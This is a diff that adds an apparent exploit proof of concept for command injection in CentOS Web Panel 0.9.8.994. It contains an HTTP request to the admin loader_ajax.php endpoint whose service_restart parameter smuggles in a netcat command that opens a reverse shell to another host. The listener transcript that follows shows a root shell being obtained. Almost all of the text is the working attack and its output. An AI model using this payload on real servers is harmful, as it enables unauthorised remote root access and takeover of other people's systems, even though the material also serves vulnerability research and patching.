@@ -1,0 +1,24 @@
+CentOS Web Panel 0.9.8.994
+
+GET /cwp_ff1b813be6bae19580d831787e113924/admin/loader_ajax.php?ajax=dashboard&service_restart=blah;nc 192.168.1.1 -e /bin/sh 65535; HTTP/1.1
+Host: 192.168.1.197:2031
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://192.168.1.197:2031/cwp_ff1b813be6bae19580d831787e113924/admin/index.php
+X-Requested-With: XMLHttpRequest
+Cookie: cwpsrv-66efff4c945d3c3b87fc271b47d456db=7koc71uocughrov2o2r7pvmed2; _firstImpression=true; resolve_ids=1; order_dir_list_by=1A
+DNT: 1
+Connection: close 
+
+
+
+
+nc -lvp 65535
+Listening on [0.0.0.0] (family 0, port 65535)
+Connection from [192.168.1.197] port 65535 [tcp/*] accepted (family 2, sport 49530)
+pwd
+/usr/local/cwpsrv/htdocs/admin/admin
+id
+uid=0(root) gid=0(root) groups=0(root)
